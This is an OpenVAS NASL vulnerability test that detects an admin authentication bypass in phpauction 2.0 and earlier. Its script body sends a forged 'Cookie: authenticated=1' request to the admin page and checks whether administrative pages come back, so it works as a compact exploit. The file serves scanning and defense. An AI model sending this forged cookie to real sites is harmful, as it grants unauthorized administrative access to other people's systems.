# OpenVAS Vulnerability Test
# $Id: phpauction_admin.nasl 17 2013-10-27 14:01:43Z jan $
# Description: phpauction Admin Authentication Bypass
#
# Authors:
# Tobias Glemser (tglemser@tele-consulting.com)
# thanks to George A. Theall and Dennis Jackson for helping writing this plugin
#
# Copyright:
# Copyright (C) 2005 Tobias Glemser (tglemser@tele-consulting.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running phpauction prior or equal to 2.0 (or a modified
version).

There is a flaw when handling cookie-based authentication credentials which 
may allow an attacker to gain unauthorized administrative access to the
auction system.";

tag_solution = "Upgrade to a version > 2.0 of this software and/or restrict access
rights to the administrative directory using .htaccess.";

# SEE:http://www.securityfocus.com/bid/12069

if(description)
{
 script_id(19239);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(12069);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 name = "phpauction Admin Authentication Bypass";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution; script_description(desc);
 summary = "Attempts to bypass phpauction administrative authentication";
 script_summary(summary);
 script_category(ACT_ATTACK);

 script_copyright("(C) 2005 Tobias Glemser (tglemser@tele-consulting.com)");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://pentest.tele-consulting.com/advisories/04_12_21_phpauction.txt");
 exit(0);
}

# The script code starts here
include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

port = get_http_port(default:80);
# Check if Port 80 is open
if(!get_port_state(port))exit(0);
# Check if PHP is enabled
if(!can_host_php(port:port))exit(0);


if ( thorough_tests ) 
	dirs = make_list( "/phpauction", "/auction", "/auktion", cgi_dirs());
else 
	dirs = cgi_dirs();

foreach dir (dirs)
{
  req = http_get(item:dir +"/admin/admin.php", port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, '\r\nCookie: authenticated=1;', idx, idx);
  res = http_keepalive_send_recv(port:port, data:req);
  #display("res='", res, "'.\n");
  if( res == NULL ) exit(0);

  if("settings.php" >< res || "durations.php" >< res || ("main.php" >< res && "<title>Administration</title>" >< res))
   {
    security_hole(port);
    exit(0);
   }
}
